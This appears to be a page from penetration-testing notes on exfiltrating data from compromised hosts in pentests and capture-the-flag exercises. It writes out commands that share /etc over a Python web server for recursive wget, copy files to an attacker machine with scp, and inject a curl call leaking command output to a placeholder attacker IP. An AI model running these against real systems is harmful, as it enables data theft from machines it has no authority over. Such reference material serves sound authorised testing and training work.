# Data Exfiltration
In this module I will cover methods, applications, and syntax used for data exfiltration techniques that I have used during penetration testing or capture the flag.
## Python SimpleHTTPServer
If Python (2.x) is installed on the target system, you can simply start the [SimpleHTTPServer](https://www.pythonforbeginners.com/modules-in-python/how-to-use-simplehttpserver/) 
using the following command in whatever directory that you wish to share temporarily.
```
www-data@target-system:/etc# python -m SimpleHTTPServer 5432
```
And this will instantly share the files on the target system in `/etc` (as you see that is where I started the service) via HTTP on port `5432`
You can then use `wget` recursivley to pull all files found like so, from the attacker machine,
```
root@attacker-system:~/ctf/target/# wget -r http://(TARGET IP ADDRESS):5432 
```
## Python http.server
In Python 3, `SimpleHTTPServer` was merged with `http.server` and you can perform the same as we did in the previous version listing above with the syntax of,
```
www-data@target-system:~# python -m http.server 5432
```
## SCP (SSH)
If SSH is installed on the target system, we can simply use `scp` to exfiltrate data from the target server onto our attacker machine. First, we need to ensure that SSH is running on the attacker machine to accept the connection and file from the target.
Then, we can use the following syntax to transfer the file,
```
user@target-system:~$ scp -P (PORT OF SSH ON ATTACKER) (FILENAME) \
 (USER ON ATTACKER SYSTEM)@(ATACKER IP ADDRESS):/path/on/attacker/machine.extension
```
## HTTP Logs
If command injection is possible on the target server, but it's not possible to save files anywhere to create a shell (super-unprivileged user), we can use `curl` in combination with an interpolated command output to make an HTTP request to our local HTTP server o the attacker system as so,
```
ping 127.0.0.1;curl http://(ATTACKER IP ADDRESS)?username=$(whoami)
```
Then, in out HTTP logs, we will see the output of `$(whoami)` as the GET request parameter. 
# Data Infiltration
## FTP
You can use FTP for data infiltration on any OS system if you happen to find it installed on a target machine. Check out [/Post Exploitation/ftp.md](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Post%20Exploitation/ftp.md) for more information on how to infiltrate data and binaries to a target system using FTP.
